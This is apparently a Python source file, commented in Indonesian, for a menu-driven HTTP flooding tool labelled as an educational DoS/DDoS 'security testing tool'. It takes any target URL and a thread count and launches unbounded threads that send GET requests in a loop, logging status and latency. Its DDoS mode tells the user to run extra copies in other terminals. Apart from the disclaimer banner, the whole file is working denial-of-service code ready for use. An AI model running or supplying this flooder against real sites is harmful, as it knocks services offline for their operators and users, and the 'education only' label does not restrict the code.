import threading
import requests
import sys
import time
import os

# --- DEFINISI WARNA & GAYA ---
RED    = "\033[1;31m"  
BLUE   = "\033[1;34m"
CYAN   = "\033[1;36m"
GREEN  = "\033[1;32m"
YELLOW = "\033[1;33m"
WHITE  = "\033[1;37m"
RESET  = "\033[0m"
BOLD   = "\033[1m"

def clear_screen():
    # Membersihkan layar terminal sesuai OS
    os.system('clear' if os.name == 'posix' else 'cls')

def display_header():
    header = f"""
{RED}██████╗  ██████╗ ███████╗    ██████╗ ██████╗  ██████╗ ███████╗
██╔══██╗██╔═══██╗██╔════╝    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝
██║  ██║██║   ██║███████╗    ██║  ██║██║  ██║██║   ██║███████╗
██║  ██║██║   ██║╚════██║    ██║  ██║██║  ██║██║   ██║╚════██║
██████╔╝╚██████╔╝███████║    ██████╔╝██████╔╝╚██████╔╝███████║
╚═════╝  ╚═════╝ ╚══════╝    ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝{RESET}
          {BOLD}LAB INFORMATIKA - SECURITY TESTING TOOL{RESET}
    """
    print(header)
    print(f"{CYAN}====================================================={RESET}")
    print(f"{WHITE} Tools ini dibuat oleh Gunawan hanya untuk edukasi!!{RESET}")
    print(f"{WHITE} 	Bukan untuk perbuatan kejahatan yang dapat	{RESET}")
    print(f"{WHITE} 		Melanggar hukum UU ITE!!		{RESET}")
    print(f"{CYAN}====================================================={RESET}\n")
    print(f"{CYAN}====================================================={RESET}")
    print(f"{WHITE}  [+] Created for Educational Purposes Only         {RESET}")
    print(f"{CYAN}====================================================={RESET}\n")

def attack(target_url, thread_id):
    attack_count = 0
    while True:
        attack_count += 1
        try:
            # Mencatat waktu mulai untuk menghitung latensi
            start_time = time.time()
            
            # Melakukan pengiriman paket (GET Request)
            response = requests.get(target_url, timeout=5)
            
            # Menghitung durasi respon (ms)
            latency = round((time.time() - start_time) * 1000, 2)
            
            # Mencetak log dalam bentuk LIST
            log_msg = (f"{GREEN}[SUCCESS]{RESET} Thread-{thread_id} | "
                       f"Req: {attack_count} | Status: {response.status_code} | "
                       f"Latency: {latency}ms")
            print(log_msg)
            
        except requests.exceptions.RequestException:
            # Jika server down atau koneksi terputus
            print(f"{RED}[FAILED]{RESET}  Thread-{thread_id} | Req: {attack_count} | Error: Server Unreachable")
        
        # Jeda tipis agar terminal tidak nge-freeze karena terlalu banyak print
        time.sleep(0.05)

def start_process(mode_name):
    target = input(f"\n{BOLD}[?]{RESET} Masukkan URL Target (contoh: http://127.0.0.1:8080): ")
    
    # Validasi input URL sederhana
    if not target.startswith("http"):
        print(f"{RED}[!] Error: Gunakan format http:// atau https://{RESET}")
        return

    try:
        threads_count = int(input(f"{BOLD}[?]{RESET} Masukkan Jumlah Threads (kekuatan): "))
    except ValueError:
        print(f"{RED}[!] Error: Masukkan angka yang valid.{RESET}")
        return

    print(f"\n{BLUE}[*] Inisialisasi {mode_name}...{RESET}")
    time.sleep(1)
    
    print(f"\n{YELLOW}{'='*70}{RESET}")
    print(f"{BOLD}MENYERANG TARGET: {target}{RESET}")
    print(f"{YELLOW}{'='*70}{RESET}\n")

    # Menjalankan thread sesuai jumlah input
    for i in range(threads_count):
        # i + 1 digunakan sebagai ID thread untuk tampilan log
        t = threading.Thread(target=attack, args=(target, i + 1))
        t.daemon = True 
        t.start()
    
    # Menjaga program tetap berjalan sampai ditekan CTRL+C
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n\n{RED}[!] Serangan Dihentikan oleh Pengguna.{RESET}")
        sys.exit()

def main():
    clear_screen()
    display_header()
    
    print(f"{BOLD}PILIH METODE SERANGAN:{RESET}")
    print(f"{GREEN}1.{RESET} Serangan DoS (Simulasi Satu Komputer)")
    print(f"{GREEN}2.{RESET} Serangan DDoS (Simulasi Banyak Komputer)")
    print(f"{RED}0.{RESET} Keluar")
    
    choice = input(f"\n{BOLD}Pilihan Anda > {RESET}")

    if choice == '1':
        start_process("DoS Mode")
    elif choice == '2':
        print(f"\n{YELLOW}[INFO]{RESET} Jalankan script ini di terminal lain untuk menambah kekuatan DDoS.")
        start_process("DDoS Mode")
    elif choice == '0':
        print("Keluar...")
        sys.exit()
    else:
        print(f"{RED}[!] Pilihan tidak valid.{RESET}")
        time.sleep(2)
        main()

if __name__ == "__main__":
    main()
